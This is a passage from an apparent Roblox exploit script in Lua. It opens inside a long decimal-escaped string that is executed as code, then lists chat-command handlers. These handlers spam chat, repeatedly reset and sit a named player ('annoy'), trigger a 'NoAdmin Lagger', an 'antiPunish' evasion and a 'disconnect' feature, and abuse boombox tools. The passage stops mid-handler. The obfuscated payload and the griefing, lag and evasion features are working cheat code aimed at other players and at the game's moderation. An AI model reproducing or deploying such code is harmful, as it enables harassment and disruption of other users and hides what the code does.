115\105\109\40\41\41\10\9\103\97\109\101\46\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\80\117\108\115\101\34\41\58\68\101\115\116\114\111\121\40\41\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\67\97\110\67\111\108\108\105\100\101\32\61\32\116\114\117\101\10\9\9\101\110\100\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\82\117\110\83\101\114\118\105\99\101\34\41\46\72\101\97\114\116\98\101\97\116\58\119\97\105\116\40\41\10\9\117\110\116\105\108\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\109\101\46\78\97\109\101\41\41\10\9\119\97\105\116\40\46\50\41\10\9\112\97\114\116\32\61\32\110\105\108\10\9\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\71\114\97\118\105\116\121\32\61\32\49\57\54\46\50\10\9\119\97\105\116\40\41\10\9\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\46\67\70\114\97\109\101\32\61\32\115\112\111\115\10\9\99\104\101\99\107\101\114\32\61\32\102\97\108\115\101\10\101\110\100\10\108\111\99\97\108\32\102\105\108\101\115\116\117\102\102\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\114\101\97\100\102\105\108\101\40\34\115\97\118\101\100\116\104\105\110\103\115\46\108\117\97\34\41\44\32\34\92\110\34\41\10\108\111\99\97\108\32\110\101\119\116\105\110\103\115\32\61\32\123\125\10\108\111\99\97\108\32\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\110\101\119\98\111\120\110\101\119\112\97\114\116\115\32\61\32\123\125\10\108\111\99\97\108\32\116\119\101\101\110\115\101\114\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\84\119\101\101\110\83\101\114\118\105\99\101\34\41\10\108\111\99\97\108\32\110\117\109\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\110\117\109\32\61\32\105\10\9\108\111\99\97\108\32\115\112\108\105\116\115\116\114\32\61\32\118\58\115\112\108\105\116\40\39\47\39\41\10\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\10\9\9\99\111\110\116\105\110\117\101\10\9\101\110\100\10\9\102\111\114\32\95\44\32\97\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\97\46\78\97\109\101\32\61\61\32\115\112\108\105\116\115\116\114\91\49\93\32\97\110\100\32\97\58\73\115\65\40\34\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\112\97\114\116\32\61\32\97\10\9\9\9\108\111\99\97\108\32\99\102\32\61\32\115\112\108\105\116\115\116\114\91\50\93\10\9\9\9\108\111\99\97\108\32\112\116\32\61\32\115\112\108\105\116\115\116\114\91\49\93\10\9\9\9\108\111\99\97\108\32\112\97\114\116\10\9\9\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\9\9\101\110\100\10\10\9\9\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\32\61\32\97\58\67\108\111\110\101\40\41\10\9\9\9\110\101\119\112\97\114\116\46\80\97\114\101\110\116\32\61\32\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\87\111\114\107\115\112\97\99\101\34\41\10\9\9\9\110\101\119\112\97\114\116\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\10\9\9\9\110\101\119\112\97\114\116\46\67\70\114\97\109\101\32\61\32\99\102\114\97\109\32\42\32\67\70\114\97\109\101\46\110\101\119\40\49\42\40\97\46\83\105\122\101\46\88\47\50\41\43\40\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\91\39\84\111\114\115\111\39\93\46\83\105\122\101\46\88\47\50\41\44\32\48\44\32\48\41\10\9\9\9\110\101\119\112\97\114\116\46\78\97\109\101\32\61\32\34\70\97\107\101\32\80\97\114\116\32\34\46\46\105\10\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\41\10\9\9\9\108\111\99\97\108\32\110\101\119\112\97\114\116\98\111\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\101\108\101\99\116\105\111\110\66\111\120\34\41\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\65\100\111\114\110\101\101\32\61\32\110\101\119\112\97\114\116\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\48\44\48\41\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\110\101\119\40\49\44\32\48\44\32\48\41\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\10\9\9\9\110\101\119\112\97\114\116\98\111\120\46\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\10\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\44\32\110\101\119\112\97\114\116\98\111\120\41\10\9\9\9\108\111\99\97\108\32\110\101\119\115\101\108\98\111\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\101\108\101\99\116\105\111\110\66\111\120\34\41\10\9\9\9\110\101\119\115\101\108\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\9\110\101\119\115\101\108\98\111\120\46\65\100\111\114\110\101\101\32\61\32\97\10\9\9\9\110\101\119\115\101\108\98\111\120\46\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\50\53\53\44\48\44\48\41\10\9\9\9\110\101\119\115\101\108\98\111\120\46\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\110\101\119\40\49\44\32\48\44\32\48\41\10\9\9\9\110\101\119\115\101\108\98\111\120\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\10\9\9\9\110\101\119\115\101\108\98\111\120\46\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\10\9\9\9\116\97\98\108\101\46\105\110\115\101\114\116\40\110\101\119\116\105\110\103\115\44\32\110\101\119\115\101\108\98\111\120\41\10\9\9\101\110\100\10\9\101\110\100\10\101\110\100\10\112\114\105\110\116\40\34\84\104\101\114\101\32\65\114\101\32\34\46\46\116\111\115\116\114\105\110\103\40\110\117\109\41\46\46\34\32\80\97\114\116\115\32\73\110\32\84\104\105\115\32\66\117\105\108\100\34\41\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\102\105\108\101\115\116\117\102\102\41\32\100\111\10\9\105\102\32\118\32\61\61\32\34\34\32\116\104\101\110\32\99\111\110\116\105\110\117\101\32\101\110\100\10\9\112\114\105\110\116\40\34\77\111\118\105\110\103\32\80\97\114\116\32\34\46\46\105\41\10\9\108\111\99\97\108\32\115\101\112\32\61\32\115\116\114\105\110\103\46\115\112\108\105\116\40\118\44\32\34\47\34\41\10\9\108\111\99\97\108\32\99\102\32\61\32\115\101\112\91\50\93\10\9\108\111\99\97\108\32\112\116\32\61\32\115\101\112\91\49\93\10\9\108\111\99\97\108\32\112\97\114\116\10\9\108\111\99\97\108\32\102\117\110\99\116\105\111\110\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\105\110\112\117\116\41\10\9\9\114\101\116\117\114\110\32\67\70\114\97\109\101\46\110\101\119\40\117\110\112\97\99\107\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\72\116\116\112\83\101\114\118\105\99\101\39\41\58\74\83\79\78\68\101\99\111\100\101\40\39\91\39\46\46\105\110\112\117\116\46\46\39\93\39\41\41\41\10\9\101\110\100\10\9\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\46\87\111\114\107\115\112\97\99\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\97\110\100\32\118\46\78\97\109\101\32\61\61\32\112\116\32\116\104\101\110\10\9\9\9\112\97\114\116\32\61\32\118\10\9\9\9\105\102\32\112\97\114\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\73\110\116\101\114\101\115\116\34\41\32\116\104\101\110\10\9\9\9\9\112\97\114\116\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\40\34\84\111\117\99\104\73\110\116\101\114\101\115\116\34\41\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\110\100\10\9\9\101\110\100\10\9\101\110\100\10\9\108\111\99\97\108\32\99\102\114\97\109\32\61\32\115\116\114\105\110\103\84\111\67\70\114\97\109\101\40\99\102\41\10\9\108\111\99\97\108\32\99\101\110\116\101\114\32\61\32\112\97\114\116\46\80\111\115\105\116\105\111\110\10\9\108\111\99\97\108\32\114\97\100\105\117\115\32\61\32\49\32\43\32\112\97\114\116\46\83\105\122\101\46\88\10\9\105\102\32\40\99\101\110\116\101\114\45\99\102\114\97\109\46\80\111\115\105\116\105\111\110\41\46\109\97\103\110\105\116\117\100\101\32\60\61\32\114\97\100\105\117\115\32\116\104\101\110\10\9\101\108\115\101\10\9\9\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\44\32\99\102\114\97\109\41\10\9\101\110\100\10\9\119\97\105\116\40\46\51\41\10\9\105\102\32\112\97\114\116\46\67\70\114\97\109\101\32\126\61\32\99\102\114\97\109\32\116\104\101\110\10\9\9\108\111\99\97\108\32\115\101\108\98\111\120\32\61\32\110\101\119\116\105\110\103\115\91\105\93\10\9\9\115\101\108\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\115\101\108\98\111\120\46\65\100\111\114\110\101\101\32\61\32\112\97\114\116\10\9\9\108\111\99\97\108\32\116\119\101\101\110\105\110\102\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\10\9\9\9\48\46\51\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\81\117\97\100\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\79\117\116\44\10\9\9\9\48\44\10\9\9\9\102\97\108\115\101\44\10\9\9\9\48\10\9\9\41\10\9\9\108\111\99\97\108\32\116\119\101\101\110\49\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\10\9\9\9\115\101\108\98\111\120\44\10\9\9\9\116\119\101\101\110\105\110\102\44\10\9\9\9\123\10\9\9\9\9\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\50\53\53\44\48\41\44\10\9\9\9\9\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\110\101\119\40\48\44\32\48\46\53\44\32\48\41\44\10\9\9\9\9\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\44\10\9\9\9\9\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\10\9\9\9\125\10\9\9\41\10\9\9\116\119\101\101\110\49\58\80\108\97\121\40\41\10\9\101\110\100\10\9\114\101\112\101\97\116\10\9\9\119\97\105\116\40\41\10\9\117\110\116\105\108\32\99\104\101\99\107\101\114\32\61\61\32\102\97\108\115\101\10\9\119\97\105\116\40\46\51\41\10\9\105\102\32\112\97\114\116\46\67\70\114\97\109\101\32\61\61\32\99\102\114\97\109\32\116\104\101\110\10\9\9\116\97\107\101\112\97\114\116\116\111\40\112\97\114\116\44\32\99\102\114\97\109\41\10\9\9\108\111\99\97\108\32\115\101\108\98\111\120\32\61\32\110\101\119\116\105\110\103\115\91\105\93\10\9\9\115\101\108\98\111\120\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\10\9\9\115\101\108\98\111\120\46\65\100\111\114\110\101\101\32\61\32\112\97\114\116\10\9\9\108\111\99\97\108\32\116\119\101\101\110\105\110\102\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\10\9\9\9\48\46\51\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\81\117\97\100\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\79\117\116\44\10\9\9\9\48\44\10\9\9\9\102\97\108\115\101\44\10\9\9\9\48\10\9\9\41\10\9\9\108\111\99\97\108\32\116\119\101\101\110\49\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\10\9\9\9\115\101\108\98\111\120\44\10\9\9\9\116\119\101\101\110\105\110\102\44\10\9\9\9\123\10\9\9\9\9\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\50\53\53\44\48\41\44\10\9\9\9\9\83\117\114\102\97\99\101\67\111\108\111\114\51\32\61\32\67\111\108\111\114\51\46\110\101\119\40\48\44\32\48\46\53\44\32\48\41\44\10\9\9\9\9\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\53\44\10\9\9\9\9\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\46\55\10\9\9\9\125\10\9\9\41\10\9\9\116\119\101\101\110\49\58\80\108\97\121\40\41\10\9\101\110\100\10\101\110\100\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\98\111\120\110\101\119\112\97\114\116\115\41\32\100\111\32\118\58\68\101\115\116\114\111\121\40\41\32\101\110\100\10\119\97\105\116\40\49\41\10\102\111\114\32\105\44\32\118\32\105\110\32\112\97\105\114\115\40\110\101\119\116\105\110\103\115\41\32\100\111\10\9\99\111\114\111\117\116\105\110\101\46\119\114\97\112\40\102\117\110\99\116\105\111\110\40\41\10\9\9\108\111\99\97\108\32\116\119\101\101\110\105\110\102\32\61\32\84\119\101\101\110\73\110\102\111\46\110\101\119\40\10\9\9\9\48\46\56\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\83\116\121\108\101\46\81\117\97\100\44\10\9\9\9\69\110\117\109\46\69\97\115\105\110\103\68\105\114\101\99\116\105\111\110\46\79\117\116\44\10\9\9\9\48\44\10\9\9\9\102\97\108\115\101\44\10\9\9\9\48\10\9\9\41\10\9\9\108\111\99\97\108\32\116\119\101\101\110\49\32\61\32\116\119\101\101\110\115\101\114\58\67\114\101\97\116\101\40\10\9\9\9\118\44\10\9\9\9\116\119\101\101\110\105\110\102\44\10\9\9\9\123\10\9\9\9\9\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\44\10\9\9\9\9\83\117\114\102\97\99\101\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\10\9\9\9\125\10\9\9\41\10\9\9\116\119\101\101\110\49\58\80\108\97\121\40\41\10\9\9\119\97\105\116\40\46\54\41\10\9\9\118\58\68\101\115\116\114\111\121\40\41\10\9\101\110\100\41\40\41\10\101\110\100\10")()
                    end
                    if msg:lower() == prefix .. "rj" then
                        game:GetService("TeleportService"):TeleportToPlaceInstance(112420803, game.JobId)
                    end
                                        --// GUI cmds \\--

                    if msg:lower() == prefix .. "guiinput cmds" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*cmds"]
                        for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                            v:Fire()
                        end
                        for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                            v:Fire()
                        end
                    end
                    if msg:lower() == prefix .. "guiinput rainbowex" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["RainbowEx"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput clickexplode" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickExplode"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput clickpadban" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickPadban"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput clickfard" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickFard"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput clickannoy" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["ClickAnnoy"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput hideregenpad np" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["HideRegenPad NP"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput hideregenpad" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["HideRegenPad NP"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput deleteregenpad" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["DeleteRegenPad"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput rainbowpads" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["RainbowPads"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput deleteadminpads" then
                        cht("//removepads")
                    end
                    if msg:lower() == prefix .. "guiinput noadmin lagger fe" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*NoAdmin Lagger FE"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput silent cmds" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["Silent cmds"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput builds" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Builds"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput f3x instead of btools" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["F3x instead of btools"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antigears" then
                        antigear = true
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiGears"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                            cht("/toggle anticrashvg")
                    end
                    if msg:lower() == prefix .. "guiinput antilag" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiLag"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antispeed" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiSpeed"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput perm" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Perm"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput guns" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["Guns"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput executor specs" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["*Executor Specs"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antipunish" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["antiPunish | RISK"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput autoheal" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AutoHeal"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antiblind" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiBlind"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antisetgrav" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiSetgrav"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antiattach" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiAttach"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "guiinput antiteleport" then
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame["AntiTeleport"]
                            for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                                v:Fire()
                            end
                            for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                                v:Fire()
                            end
                    end
                    if msg:lower() == prefix .. "allantis" then
                        cht("//guiinput antisetgrav");task.wait(.35)
                        cht("//guiinput antispeed");task.wait(.35)
                        cht("//guiinput antiblind");task.wait(.35)
                        cht("//guiinput antipunish");task.wait(.35)
                        cht("//guiinput antilag");task.wait(.35)
                        cht("//guiinput antiattach");task.wait(.35)
                        cht("//guiinput antigears");task.wait(1.65)
                        cht("//guiinput antiteleport");task.wait(.35)
                    end
                    if string.sub(msg:lower(), 0, 4 + #prefix) == prefix .. "spam" then
                        local msggg = string.sub(msg:lower(), 6 + #prefix)
                        spam = true
                        while spam do
                            Utils:__wait()
                            cht(msggg)
                        end
                    end
                    if string.sub(msg:lower(), 0, 10) == prefix .. "guiinput" then -- This only works with everything with message lower
                        local guibutton = string.sub(msg:lower(), 12)
                        local Bpath = game:GetService("Players").LocalPlayer.PlayerGui["SCv2_ButtonList"].Frame.ScrollingFrame[guibutton]
                        for i, v in pairs(GC(Bpath.MouseButton1Click)) do
                            v:Fire()
                        end
                        for i, v in pairs(GC(Bpath.MouseButton1Down)) do
                            v:Fire()
                        end
                    end
                    if string.sub(msg:lower(), 0, 8 + #prefix) == prefix .. "mbxxmbxx" then
                        cht("//boombox");wait(2)
                        setclipboard("5648499584")
                        local msggg = string.sub(msg:lower(), 10 + #prefix) -- 5648499584
                        local tlrs = game.Players.LocalPlayer.Backpack:GetDescendants()
                        local plrs = game:GetService("Players")
                        local chr = plrs.LocalPlayer.Character

                        for i, v in pairs(tlrs) do
                            coroutine.wrap(
                                function()
                                    if v:IsA "Tool" then
                                        function rng()
                                            return math.random(-128, 128)
                                        end
                                        v.GripPos = Vector3.new(rng(), 1, rng())
                                        wait(0.25)
                                        v.Parent = chr
                                        wait(0.25) -- wait for tool to equip
                                        v.Remote:FireServer("PlaySong", tonumber(msggg)) -- play song
                                    end
                                end)()
                        end
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "tspam" then
                        local msggg = string.sub(msg:lower(), 7 + #prefix)
                        spam = true
                        while spam do
                            wait(3.5)
                            cht(msggg)
                        end
                    end
                    if string.sub(msg:lower(), 0, 5 + #prefix) == prefix .. "annoy" then
                        local msggg = string.sub(msg:lower(), 7 + #prefix)
                        spam = true
                        while spam do
                            wait(0.8)
                            cht("reset " .. msggg .. " " .. math.random(1, 1000));wait(0.2)
                            cht("sit " .. msggg .. " " .. math.random(1, 1000))
                        end
                    end
                    if string.sub(msg:lower(), 0, 10 + #prefix) == prefix .. "disconnect" then
                        local msggg = string.sub(msg:lower(), 12 + #prefix)
                            temploopgrab = true
